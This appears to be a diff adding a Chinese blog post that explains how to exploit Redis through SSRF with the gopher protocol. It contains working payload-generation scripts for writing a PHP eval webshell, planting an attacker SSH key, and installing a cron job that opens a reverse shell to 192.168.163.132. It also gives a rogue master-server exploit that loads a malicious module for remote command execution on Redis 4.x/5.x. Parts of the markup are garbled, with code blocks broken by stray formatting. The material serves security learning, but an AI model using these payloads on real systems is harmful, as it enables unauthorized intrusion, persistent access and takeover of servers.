@@ -138,6 +138,244 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-浅析Redis中SSRF的利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/07/15/浅析Redis中SSRF的利用/">浅析Redis中SSRF的利用</a>
+    </h1>
+  
+
+        
+        <a href="/2019/07/15/浅析Redis中SSRF的利用/" class="archive-article-date">
+  	<time datetime="2019-07-15T13:43:42.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF介绍"><a href="#SSRF介绍" class="headerlink" title="SSRF介绍"></a>SSRF介绍</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。这里我们要介绍的是关于<code>redis</code>中SSRF的利用，如果有什么错误的地方还请师傅们不吝赐教/握拳。</p>
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>文章中的数据包构造会涉及到redis的<code>RESP</code>协议，所以我们这里先科普一下，了解RESP协议的师傅可以跳过=。=</p>
+<h2 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h2><p><code>Redis</code>服务器与客户端通过<code>RESP</code>（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<ol>
+<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
+<li>服务器根据命令实现回复一种RESP类型。</li>
+</ol>
+<p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p>
+<p>我们用<code>tcpdump</code>来抓个包来测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port 6379 -w ./Desktop/1.pcap</span><br></pre></td></tr></table></figure></p>
+<p>redis客户端中执行如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.163.128:6379&gt; set name test</span><br><span class="line">OK</span><br><span class="line">192.168.163.128:6379&gt; get name</span><br><span class="line">&quot;test&quot;</span><br><span class="line">192.168.163.128:6379&gt;</span><br></pre></td></tr></table></figure></p>
+<p>抓到的数据包如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713085931-794d2d5e-a509-1.png" alt="image.png"><br>hex转储看一下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713090053-a9d401f0-a509-1.png" alt="image.png"></p>
+<p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p>
+<h1 id="Redis配合gohper协议进行SSRF"><a href="#Redis配合gohper协议进行SSRF" class="headerlink" title="Redis配合gohper协议进行SSRF"></a>Redis配合gohper协议进行SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>Gopher</code> 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议，不过现在gopher协议用得已经越来越少了<br><code>Gopher</code> 协议可以说是SSRF中的万金油，。利用此协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能未授权或者能通过弱口令认证访问到Redis服务器</span><br></pre></td></tr></table></figure>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>redis常见的SSRF攻击方式大概有这几种：</p>
+<ol>
+<li><p>绝对路径写webshell</p>
+</li>
+<li><p>写ssh公钥</p>
+</li>
+<li><p>写contrab计划任务反弹shell</p>
+</li>
+</ol>
+<p>下面我们逐个实现</p>
+<h2 id="绝对路径写webshell"><a href="#绝对路径写webshell" class="headerlink" title="绝对路径写webshell"></a>绝对路径写webshell</h2><p>这个方法比较常用，也是用得最多的=。=</p>
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &apos;&lt;?php eval($_GET[&quot;cmd&quot;]);?&gt;&apos;</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<p>写了一个简单的脚本，转化为redis RESP协议的格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=&quot;gopher://&quot;</span><br><span class="line">ip=&quot;192.168.163.128&quot;</span><br><span class="line">port=&quot;6379&quot;</span><br><span class="line">shell=&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br><span class="line">filename=&quot;shell.php&quot;</span><br><span class="line">path=&quot;/var/www/html&quot;</span><br><span class="line">passwd=&quot;&quot;</span><br><span class="line">cmd=[&quot;flushall&quot;,</span><br><span class="line">	 &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class="line">	 &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class="line">	 &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class="line">	 &quot;save&quot;</span><br><span class="line">	 ]</span><br><span class="line">if passwd:</span><br><span class="line">	cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class="line">payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;</span><br><span class="line">def redis_format(arr):</span><br><span class="line">	CRLF=&quot;\r\n&quot;</span><br><span class="line">	redis_arr = arr.split(&quot; &quot;)</span><br><span class="line">	cmd=&quot;&quot;</span><br><span class="line">	cmd+=&quot;*&quot;+str(len(redis_arr))</span><br><span class="line">	for x in redis_arr:</span><br><span class="line">		cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	return cmd</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">	for x in cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print payload</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184952-f1bb74e2-a55b-1.png" alt="image.png"></p>
+<p>生成payload后，用<code>curl</code>打一波</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713184859-d1be7432-a55b-1.png" alt="image.png"></p>
+<p>执行成功，我们看一波shell是否写入成功</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713185023-04486f84-a55c-1.png" alt="image.png"></p>
+<p>成功写入</p>
+<h2 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h2><p>如果<code>.ssh</code>目录存在，则直接写入<code>~/.ssh/authorized_keys</code><br>如果不存在，则可以利用<code>crontab</code>创建该目录</p>
+<h3 id="构造payload-1"><a href="#构造payload-1" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &apos;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&apos;</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename=&quot;authorized_keys&quot;</span><br><span class="line">ssh_pub=&quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC/PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR/BSq30ixoAT1vKKYMp8+8/eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F/3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali\n\n&quot;</span><br><span class="line">path=&quot;/root/.ssh/&quot;</span><br></pre></td></tr></table></figure></p>
+<p>生成payload<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183658-246f246c-a55a-1.png" alt="image.png"><br><code>curl</code>打一波<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183322-a37e93d8-a559-1.png" alt="image.png"><br>我们来查看一波是否成功写入</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183413-c1a43818-a559-1.png" alt="image.png"><br>成功写入，尝试连接</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713183504-e0404db6-a559-1.png" alt="image.png"><br>成功连接</p>
+<h2 id="利用contrab计划任务反弹shell"><a href="#利用contrab计划任务反弹shell" class="headerlink" title="利用contrab计划任务反弹shell"></a>利用contrab计划任务反弹shell</h2><p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
+<ol>
+<li><p>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</p>
+</li>
+<li><p>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p>
+</li>
+</ol>
+<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
+<h3 id="构造payload-2"><a href="#构造payload-2" class="headerlink" title="构造payload"></a>构造payload</h3><p>构造redis的命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &apos;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.163.132/2333 0&gt;&amp;1\n\n&apos;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure></p>
+<p>转化为redis RESP协议的格式<br><strong>PS：将第一个脚本改一下</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reverse_ip=&quot;192.168.163.132&quot;</span><br><span class="line">reverse_port=&quot;2333&quot;</span><br><span class="line">cron=&quot;\n\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)</span><br><span class="line">filename=&quot;root&quot;</span><br><span class="line">path=&quot;/var/spool/cron&quot;</span><br></pre></td></tr></table></figure></p>
+<p>生成一波，尝试反弹shell<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174818-57eaa354-a553-1.png" alt="image.png"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190713174721-35fd0ebc-a553-1.png" alt="image.png"></p>
+<p>成功反弹shell</p>
+<h1 id="Redis4-x-5-x从SSRF到RCE"><a href="#Redis4-x-5-x从SSRF到RCE" class="headerlink" title="Redis4.x/5.x从SSRF到RCE"></a>Redis4.x/5.x从SSRF到RCE</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到RR师傅在朋友圈发的redis4.x/5.x rce，原本想去搞搞看的，但是无奈本菜鸡正处于考试预习阶段QAQ，所以没什么心思去看 =。=，直到考完试才安心下来看，不过网上已经很多关于redis rce分析的文章，但是我发现大多数都是一笔带过没怎么看懂（我理解能力比较差），所以决定自己搞一下。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">PPT</a></p>
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>利用条件：</p>
+<ul>
+<li>能未授权或者能通过弱口令认证访问到Redis服务器</li>
+</ul>
+<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>主从复制的概述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</span><br><span class="line">redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190712203930-18130eb2-a4a2-1.png" alt="image.png"></p>
+<p>建立主从复制，有3种方式：</p>
+<ol>
+<li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
+<li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
+<li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
+</ol>
+<p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
+<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">redis-server /etc/redis/redis6380.conf</span><br></pre></td></tr></table></figure></p>
+<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/bin# redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; SLAVEOF 127.0.0.1 6380</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; get test</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6379&gt; exit</span><br><span class="line">root@kali:/usr/bin# redis-cli -p 6380</span><br><span class="line">127.0.0.1:6380&gt; get test</span><br><span class="line">(nil)</span><br><span class="line">127.0.0.1:6380&gt; set test &quot;test&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6380&gt; get test</span><br><span class="line">&quot;test&quot;</span><br><span class="line">127.0.0.1:6380&gt; exit</span><br><span class="line">root@kali:/usr/bin# redis-cli -p 6379</span><br><span class="line">127.0.0.1:6379&gt; get test</span><br><span class="line">&quot;test&quot;</span><br></pre></td></tr></table></figure></p>
+<p>执行一波，我们可以明显看到数据达到了同步的效果.<br>如果我们想解除主从关系可以执行<figure class="highlight plain"><figcaption><span>NO ONE```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">### redis module</span><br><span class="line">自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。</span><br><span class="line">Redis模块是动态库，可以在启动时或使用``MODULE LOAD``命令加载到Redis中。</span><br><span class="line"></span><br><span class="line">恶意so文件编写：[https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK](https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK &quot;https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK&quot;)</span><br><span class="line"></span><br><span class="line">### 利用原理</span><br><span class="line">利用步骤，贴一下PPT上的步骤</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190712235651-a9a794c2-a4bd-1.png)</span><br><span class="line">slave和master的握手协议过程</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190713002514-a0feb180-a4c1-1.png)</span><br><span class="line">图中一些常量说明</span><br></pre></td></tr></table></figure></p>
+<p>#define REPL_STATE_CONNECTING 2 /<em> 等待和master连接 </em>/<br>/<em> — 握手状态开始 — </em>/</p>
+<p>#define REPL_STATE_RECEIVE_PONG 3 /<em> 等待PING返回 </em>/</p>
+<p>#define REPL_STATE_SEND_AUTH 4 /<em> 发送认证消息 </em>/</p>
+<p>#define REPL_STATE_RECEIVE_AUTH 5 /<em> 等待认证回复 </em>/</p>
+<p>#define REPL_STATE_SEND_PORT 6 /<em> 发送REPLCONF信息，主要是当前实例监听端口 </em>/</p>
+<p>#define REPL_STATE_RECEIVE_PORT 7 /<em> 等待REPLCONF返回 </em>/</p>
+<p>#define REPL_STATE_SEND_CAPA 8 /<em> 发送REPLCONF capa </em>/</p>
+<p>#define REPL_STATE_RECEIVE_CAPA 9 /<em> 等待REPLCONF返回 </em>/</p>
+<p>#define REPL_STATE_SEND_PSYNC 10 /<em> 发送PSYNC </em>/</p>
+<p>#define REPL_STATE_RECEIVE_PSYNC 11 /<em> 等待PSYNC返回 </em>/<br>/<em> — 握手状态结束 — </em>/</p>
+<p>#define REPL_STATE_TRANSFER 12 /<em> 正在从master接收RDB文件 </em>/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我这里主要讲一下最重要的那一步，就是利用全量复制将master上的``RDB``文件同步到slave上，这一步就是将我们的恶意so文件同步到slave上，从而加载恶意so文件达到rce的目的</span><br><span class="line"></span><br><span class="line">那我们为什么一定要用全量复制呢？原因如下。</span><br><span class="line">当slave向master发送``PSYNC``命令之后，一般会得到三种回复：</span><br><span class="line">1. +FULLRESYNC：进行全量复制。</span><br><span class="line">2. +CONTINUE：进行增量同步。</span><br><span class="line">3. -ERR：当前master还不支持PSYNC。</span><br><span class="line"></span><br><span class="line">**全量复制的过程：**</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190713004119-dfd75b44-a4c3-1.png)</span><br><span class="line"></span><br><span class="line">* slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为``?``，offest为``-1``，我们来测试以下看看是不是真的如此</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190713004651-a59d01da-a4c4-1.png)</span><br><span class="line"></span><br><span class="line">* master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制，slave并对master发来的runid和offest进行保存</span><br><span class="line"></span><br><span class="line">* master把自己的runid和offset发给slave</span><br><span class="line"></span><br><span class="line">* master进行bgsave，生成RDB文件</span><br><span class="line"></span><br><span class="line">* master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</span><br><span class="line"></span><br><span class="line">* slave加载RDB文件和缓冲区数据</span><br><span class="line"></span><br><span class="line">**增量复制（又称部分复制）过程：**</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190713005510-cf74b1aa-a4c5-1.png)</span><br><span class="line"></span><br><span class="line">增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</span><br><span class="line"></span><br><span class="line">通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</span><br><span class="line"></span><br><span class="line">### 攻击流程</span><br><span class="line">* 配置一个我们需要以master身份给slave传输so文件的服务，大致流程如下</span><br></pre></td></tr></table></figure></p>
+<p>PING 测试连接是否可用<br>+PONG 告诉slave连接可用<br>REPLCONF 发送REPLCONF信息，主要是当前实例监听端口<br>+OK 告诉slave成功接受<br>REPLCONF 发送REPLCONF capa<br>+OK 告诉slave成功接受<br>PSYNC <rundi> <offest> 发送PSYNC<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如下图所示：</span><br><span class="line"></span><br><span class="line">![image.png](https://xzfile.aliyuncs.com/media/upload/picture/20190713014728-1d6e49a0-a4cd-1.png)</span><br><span class="line"></span><br><span class="line">* 将要攻击的redis服务器设置成我们的slave</span><br></pre></td></tr></table></figure></offest></rundi></p>
+<p>SLAVEOF ip port<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 设置RDB文件</span><br><span class="line">PS:这里注意以下exp.so是不能包含路径的，如果需要设置成其它目录请用``config set dir path``</span><br></pre></td></tr></table></figure></p>
+<p>config set dbfilename exp.so<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">* 告诉slave使用全量复制并从我们配置的Rouge Server接收module</span><br></pre></td></tr></table></figure></p>
+<p>+FULLRESYNC <runid> <offest>\r\n$&lt;len(payload)&gt;\r\n<payload><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS：其中``&lt;runid&gt;``无要求，不过长度一般为40，``&lt;offest&gt;``一般设置为1</span><br><span class="line"></span><br><span class="line">### exp</span><br><span class="line">贴一下exp，写得比较丑，为了节省文章的篇幅其它功能我就没有加上去了，有需要的师傅可以自行添加=。=</span><br></pre></td></tr></table></figure></payload></offest></runid></p>
+<p>import socket<br>import time</p>
+<p>CRLF=”\r\n”<br>payload=open(“exp.so”,”rb”).read()<br>exp_filename=”exp.so”</p>
+<p>def redis_format(arr):<br>    global CRLF<br>    global payload<br>    redis_arr=arr.split(“ “)<br>    cmd=””<br>    cmd+=”*”+str(len(redis_arr))<br>    for x in redis_arr:<br>        cmd+=CRLF+”$”+str(len(x))+CRLF+x<br>    cmd+=CRLF<br>    return cmd</p>
+<p>def redis_connect(rhost,rport):<br>    sock=socket.socket()<br>    sock.connect((rhost,rport))<br>    return sock</p>
+<p>def send(sock,cmd):<br>    sock.send(redis_format(cmd))<br>    print(sock.recv(1024).decode(“utf-8”))</p>
+<p>def interact_shell(sock):<br>    flag=True<br>    try:<br>        while flag:<br>            shell=raw_input(“\033[1;32;40m[*]\033[0m “)<br>            shell=shell.replace(“ “,”${IFS}”)<br>            if shell==”exit” or shell==”quit”:<br>                flag=False<br>            else:<br>                send(sock,”system.exec {}”.format(shell))<br>    except KeyboardInterrupt:<br>        return</p>
+<p>def RogueServer(lport):<br>    global CRLF<br>    global payload<br>    flag=True<br>    result=””<br>    sock=socket.socket()<br>    sock.bind((“0.0.0.0”,lport))<br>    sock.listen(10)<br>    clientSock, address = sock.accept()<br>    while flag:<br>        data = clientSock.recv(1024)<br>        if “PING” in data:<br>            result=”+PONG”+CRLF<br>            clientSock.send(result)<br>            flag=True<br>        elif “REPLCONF” in data:<br>            result=”+OK”+CRLF<br>            clientSock.send(result)<br>            flag=True<br>        elif “PSYNC” in data or “SYNC” in data:<br>            result = “+FULLRESYNC “ + “a” * 40 + “ 1” + CRLF<br>            result += “$” + str(len(payload)) + CRLF<br>            result = result.encode()<br>            result += payload<br>            result += CRLF<br>            clientSock.send(result)<br>            flag=False</p>
